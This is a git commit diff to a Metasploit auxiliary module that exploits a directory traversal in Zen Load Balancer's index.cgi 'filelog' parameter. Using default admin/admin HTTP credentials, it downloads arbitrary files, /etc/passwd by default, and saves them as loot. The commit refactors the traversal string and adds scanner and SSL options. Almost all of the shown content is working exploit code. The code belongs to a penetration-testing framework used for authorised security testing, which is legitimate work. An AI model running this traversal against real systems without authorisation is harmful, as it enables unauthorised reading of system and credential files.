1ef1142ca2022b724e7785c4bce45c7a4ed1c2ee
Shelby Pace <shelby_pace@rapid7.com>
2020-04-16 10:52:10 -0500

    add mixin, modify traversal, etc.

--- modules/auxiliary/scanner/http/zenload_balancer_traversal.rb
+++ modules/auxiliary/scanner/http/zenload_balancer_traversal.rb
@@ -5,6 +5,7 @@
 
 class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
+  include Msf::Auxiliary::Scanner
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info={})
@@ -31,27 +32,29 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(444),
+        OptBool.new('SSL', [true, 'Use SSL', true]),
         OptInt.new('DEPTH', [true, 'The max traversal depth', 16]),
         OptString.new('FILEPATH', [false, 'The name of the file to download', '/etc/passwd']),
         OptString.new('TARGETURI', [true, "The base URI path of the ZenConsole install", '/']),
         OptString.new('HttpUsername', [true, 'The username to use for the HTTP server', 'admin']),
-        OptString.new('HttpPassword', [false, 'The password to use for the HTTP server', 'admin']),
+        OptString.new('HttpPassword', [false, 'The password to use for the HTTP server', 'admin'])
       ])
   end
 
   def run_host(ip)
     filename = datastore['FILEPATH']
-    traversal = "../" * datastore['DEPTH'] << filename
+    traversal = "../" * datastore['DEPTH']
 
     res = send_request_cgi({
       'method' => 'GET',
-      'uri' => normalize_uri(target_uri.path, datastore['REPO'], 'index.cgi'),
-      'vars_get'=> {
-      'id'      => '2-3',
-      'filelog' => "#{traversal}#{datastore['FILEPATH']}",
-      'nlines'  => '100',
-      'action'  => 'See+logs'
-                   },
+      'uri' => normalize_uri(target_uri.path, 'index.cgi'),
+      'vars_get'=>
+      {
+        'id'      => '2-3',
+        'filelog' => "#{traversal}#{filename}",
+        'nlines'  => '100',
+        'action'  => 'See logs'
+      },
       'authorization' => basic_auth(datastore['HttpUsername'],datastore['HttpPassword'])
       }, 25)
 
@@ -60,7 +63,7 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    vprint_good("#{peer} - \n#{res.body}")
+    print_good("#{peer} - Downloaded #{res.body.length} bytes")
     path = store_loot(
       'zenload.http',
       'text/plain',
